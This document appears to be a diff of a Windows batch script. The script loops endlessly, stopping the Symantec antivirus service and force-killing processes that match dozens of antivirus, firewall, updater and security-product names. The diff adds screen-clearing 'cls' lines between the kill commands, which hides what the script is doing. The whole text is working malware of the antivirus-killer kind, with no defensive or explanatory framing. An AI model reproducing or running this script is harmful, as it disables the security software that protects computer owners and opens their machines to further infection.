@@ -2,80 +2,134 @@
 :loop
 net stop "symantec antivirus"
 taskkill /f /FI "MEMUSAGE gt 5" /IM av*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM fire*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM anti*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM *anti*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM *kaspersky*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM spy*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM bullguard
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM PersFw
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM KAV*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM ZONEALARM
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM SAFEWEB
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM OUTPOST
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM nv*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM nav*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM F-*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM ESAFE
+cls
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM cle
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM BLACKICE
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM def*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM kav
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM kav*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM avg*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM ash*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM aswupdsv
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM ewid*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM guard*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM guar*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM gcasDt*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM msmp*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM mcafe*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM mghtml
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM msiexec
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM outpost
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM isafe
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM zap*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM zauinst
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM upd*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM zlclien*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM minilog
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM cc*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM norton*
 cls
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM norton au*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM ccc*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM npfmn*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM loge*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM nisum*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM issvc
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM tmp*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM tmn*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM pcc*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM cpd*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM pop*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM pav*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM padmin
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM panda*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM avsch*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM sche*
 taskkill /f /FI "MEMUSAGE gt 5" /IM syman*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM virus*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM realm*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM sweep*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM scan*
 taskkill /f /FI "MEMUSAGE gt 5" /IM ad-*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM safe*
 taskkill /f /FI "MEMUSAGE gt 5" /IM avas*
+cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM norm*
 cls
 taskkill /f /FI "MEMUSAGE gt 5" /IM offg*
